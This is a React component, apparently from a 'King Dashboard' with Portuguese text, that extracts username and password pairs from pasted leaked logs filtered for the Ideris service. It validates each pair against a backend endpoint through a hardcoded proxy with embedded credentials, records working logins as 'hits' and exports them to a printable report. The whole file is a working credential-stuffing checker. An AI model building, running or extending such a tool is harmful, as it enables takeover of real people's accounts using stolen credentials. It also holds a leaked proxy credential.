"use client";

import { useState, useRef, useEffect } from 'react';

interface LogEntry {
  id: string;
  time: string;
  type: 'hit' | 'fail' | 'info' | 'error';
  message: string;
}

const FIXED_PROXY = '3ee54d1ec977870e6156:69cb68fe09fc14c6@gw.dataimpulse.com:823';

export default function IderisModule() {
  const [inputLogs, setInputLogs] = useState('');
  const [credentials, setCredentials] = useState<string[]>([]);
  const [isRunning, setIsRunning] = useState(false);
  const isRunningRef = useRef(false);
  const [progress, setProgress] = useState({ current: 0, total: 0, hits: 0, fails: 0 });
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [hitsList, setHitsList] = useState<{user: string, pass: string}[]>([]);
  const logEndRef = useRef<HTMLDivElement>(null);

  const addLog = (type: LogEntry['type'], message: string) => {
    setLogs(prev => [...prev.slice(-100), {
      id: crypto.randomUUID(),
      time: new Date().toLocaleTimeString(),
      type,
      message
    }]);
  };

  useEffect(() => {
    logEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [logs]);

  const handleExtract = () => {
    try {
      let extractedData: any[] = [];
      
      // Try parsing as JSON array
      try {
        const parsed = JSON.parse(inputLogs);
        extractedData = Array.isArray(parsed) ? parsed : [parsed];
      } catch (e) {
        // Find all JSON objects in the string
        const jsonObjects: any[] = [];
        const regex = /\{(?:[^{}]|\{(?:[^{}]|\{[^{}]*\})*\})*\}/g;
        let match;
        
        while ((match = regex.exec(inputLogs)) !== null) {
          try {
            const obj = JSON.parse(match[0]);
            jsonObjects.push(obj);
          } catch (err) {
            // If direct parse fails, try fixing common issues like trailing commas
            try {
                const fixed = match[0].replace(/,(\s*[\]\}])/g, '$1');
                jsonObjects.push(JSON.parse(fixed));
            } catch {}
          }
        }
        extractedData = jsonObjects;
      }

      const pairs = extractedData.map(log => {
        const user = log.username || log.email || log.login;
        const pass = log.password || log.senha;
        // Filter specifically for Ideris URLs if present, otherwise take all
        const isIderis = log.url ? log.url.toLowerCase().includes('ideris') : true;
        
        return (user && pass && isIderis) ? `${user}:${pass}` : null;
      }).filter(item => item !== null) as string[];

      // Deduplicate
      const uniquePairs = Array.from(new Set(pairs));
      setCredentials(uniquePairs);
      addLog('info', `Extraídas ${uniquePairs.length} credenciais únicas.`);
    } catch (err) {
      alert('Erro ao extrair dados. Verifique se o formato está correto.');
    }
  };

  const startChecking = async () => {
    if (credentials.length === 0) return alert('Por favor, extraia as credenciais primeiro.');
    
    setIsRunning(true);
    isRunningRef.current = true;
    setProgress({ current: 0, total: credentials.length, hits: 0, fails: 0 });
    setLogs([]);
    setHitsList([]);
    addLog('info', `Iniciando validação Ideris de ${credentials.length} contas...`);

    let hitCount = 0;
    let failCount = 0;

    for (let i = 0; i < credentials.length; i++) {
      if (!isRunningRef.current) break;

      const [username, password] = credentials[i].split(':').map(s => s.trim());
      addLog('info', `Verificando Ideris: ${username}...`);

      try {
        const res = await fetch('/api/validate-ideris', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password, proxy: FIXED_PROXY })
        });

        const result = await res.json();

        if (result.success) {
          hitCount++;
          setHitsList(prev => [...prev, { user: username, pass: password }]);
          addLog('hit', `[HIT] ${username}:${password}`);
        } else {
          failCount++;
          const msg = result.message || result.error || 'Falha';
          addLog('fail', `[FAIL] ${username} - ${msg}`);
        }
      } catch (err: any) {
        failCount++;
        addLog('error', `[ERRO] ${username} - Conexão perdida`);
      }

      setProgress(prev => ({ ...prev, current: i + 1, hits: hitCount, fails: failCount }));
      await new Promise(resolve => setTimeout(resolve, 800)); // Slight delay
    }

    addLog('info', 'Processo finalizado!');
    setIsRunning(false);
    isRunningRef.current = false;
  };

  const stopChecking = () => {
    isRunningRef.current = false;
    setIsRunning(false);
    addLog('error', 'Processo interrompido pelo usuário.');
  };

  const exportHitsToPDF = () => {
    if (hitsList.length === 0) return alert('Nenhum hit para exportar!');
    const printWindow = window.open('', '_blank');
    if (!printWindow) return;

    const html = `
      <html>
        <head>
          <title>Relatório Ideris - King Dashboard</title>
          <style>
            body { font-family: sans-serif; padding: 40px; color: #333; }
            h1 { color: #6d28d9; border-bottom: 2px solid #6d28d9; padding-bottom: 10px; }
            table { width: 100%; border-collapse: collapse; margin-top: 20px; }
            th { background: #f3f4f6; text-align: left; padding: 12px; }
            td { padding: 10px; border-bottom: 1px solid #eee; font-family: monospace; }
          </style>
        </head>
        <body>
          <h1>Relatório de Hits Ideris</h1>
          <p>Total de contas: ${hitsList.length}</p>
          <table>
            <thead><tr><th>Usuário</th><th>Senha</th></tr></thead>
            <tbody>
              ${hitsList.map(h => `<tr><td>${h.user}</td><td>${h.pass}</td></tr>`).join('')}
            </tbody>
          </table>
          <script>window.onload = () => { window.print(); window.close(); }</script>
        </body>
      </html>
    `;
    printWindow.document.write(html);
    printWindow.document.close();
  };

  return (
    <div style={{ display: 'grid', gridTemplateColumns: '400px 1fr', gap: '24px' }}>
      {/* Configuration & Extraction */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
        <div className="glass-card">
          <h3 style={{ marginBottom: '16px', fontSize: '18px' }}>1. Extração de Logs</h3>
          <p style={{ fontSize: '12px', opacity: 0.6, marginBottom: '12px' }}>Cole os logs Ideris no formato JSON para extrair as credenciais.</p>
          
          <textarea 
            className="input-field" 
            style={{ height: '200px', fontSize: '11px', fontFamily: 'monospace', marginBottom: '16px' }}
            placeholder='{ "username": "...", "password": "...", ... }'
            value={inputLogs}
            onChange={(e) => setInputLogs(e.target.value)}
            disabled={isRunning}
          />

          <button 
            className="btn-primary" 
            style={{ width: '100%', background: 'linear-gradient(135deg, #10b981, #059669)' }}
            onClick={handleExtract}
            disabled={isRunning || !inputLogs}
          >
            ✨ Extrair Credenciais
          </button>
        </div>

        <div className="glass-card">
          <h3 style={{ marginBottom: '16px', fontSize: '18px' }}>2. Validação Ideris</h3>
          
          <div style={{ 
            height: '150px', 
            overflowY: 'auto', 
            background: 'rgba(0,0,0,0.3)', 
            borderRadius: '8px', 
            padding: '10px', 
            fontSize: '11px', 
            fontFamily: 'monospace',
            marginBottom: '16px',
            border: '1px solid var(--border-color)'
          }}>
            {credentials.length > 0 ? (
              credentials.map((c, idx) => <div key={idx}>{c}</div>)
            ) : (
              <div style={{ opacity: 0.3, textAlign: 'center', marginTop: '60px' }}>Nenhuma credencial extraída</div>
            )}
          </div>

          <div style={{ display: 'flex', gap: '10px', marginBottom: '12px' }}>
            {!isRunning ? (
              <button 
                className="btn-primary" 
                style={{ flex: 1 }}
                onClick={startChecking}
                disabled={credentials.length === 0}
              >
                🛡️ Iniciar
              </button>
            ) : (
              <button 
                className="btn-primary" 
                style={{ flex: 1, background: 'var(--error)' }}
                onClick={stopChecking}
              >
                🛑 Parar
              </button>
            )}
          </div>

          <button 
            className="btn-primary" 
            style={{ 
              width: '100%', 
              background: hitsList.length > 0 ? 'var(--success)' : 'rgba(255,255,255,0.05)',
              opacity: hitsList.length > 0 ? 1 : 0.5
            }}
            onClick={exportHitsToPDF}
            disabled={hitsList.length === 0}
          >
            📄 Exportar Hits ({hitsList.length})
          </button>
        </div>

        <div className="glass-card" style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '12px' }}>
          <div style={{ textAlign: 'center' }}>
            <p style={{ fontSize: '12px', opacity: 0.6 }}>Hits</p>
            <h4 style={{ fontSize: '24px', color: 'var(--success)' }}>{progress.hits}</h4>
          </div>
          <div style={{ textAlign: 'center' }}>
            <p style={{ fontSize: '12px', opacity: 0.6 }}>Fails</p>
            <h4 style={{ fontSize: '24px', color: 'var(--error)' }}>{progress.fails}</h4>
          </div>
          <div style={{ gridColumn: '1 / -1' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', marginBottom: '4px' }}>
                <span>{progress.current} / {progress.total}</span>
                <span>{Math.round((progress.current / progress.total) * 100 || 0)}%</span>
            </div>
            <div style={{ width: '100%', height: '4px', background: 'rgba(255,255,255,0.1)', borderRadius: '10px' }}>
              <div style={{ 
                width: `${(progress.current / (progress.total || 1)) * 100}%`, 
                height: '100%', 
                background: 'var(--accent-primary)',
                transition: 'width 0.3s ease'
              }} />
            </div>
          </div>
        </div>
      </div>

      {/* Console Log */}
      <div className="glass-card" style={{ display: 'flex', flexDirection: 'column', height: '100%' }}>
        <h3 style={{ marginBottom: '16px', fontSize: '18px' }}>Console Ideris</h3>
        <div style={{ 
          flex: 1, 
          background: 'rgba(0,0,0,0.4)', 
          borderRadius: '12px', 
          padding: '20px', 
          fontFamily: 'monospace', 
          fontSize: '13px', 
          overflowY: 'auto',
          border: '1px solid var(--border-color)',
          minHeight: '600px'
        }}>
          {logs.length === 0 ? (
            <p style={{ opacity: 0.2, textAlign: 'center', marginTop: '250px' }}>Aguardando processamento...</p>
          ) : (
            logs.map(log => (
              <div key={log.id} style={{ marginBottom: '6px', paddingBottom: '4px', borderBottom: '1px solid rgba(255,255,255,0.02)' }}>
                <span style={{ opacity: 0.4, marginRight: '10px' }}>[{log.time}]</span>
                <span style={{ 
                  color: log.type === 'hit' ? 'var(--success)' : log.type === 'fail' ? 'var(--error)' : log.type === 'error' ? '#f87171' : 'var(--foreground)',
                  fontWeight: log.type === 'hit' ? 'bold' : 'normal'
                }}>
                  {log.message}
                </span>
              </div>
            ))
          )}
          <div ref={logEndRef} />
        </div>
      </div>
    </div>
  );
}
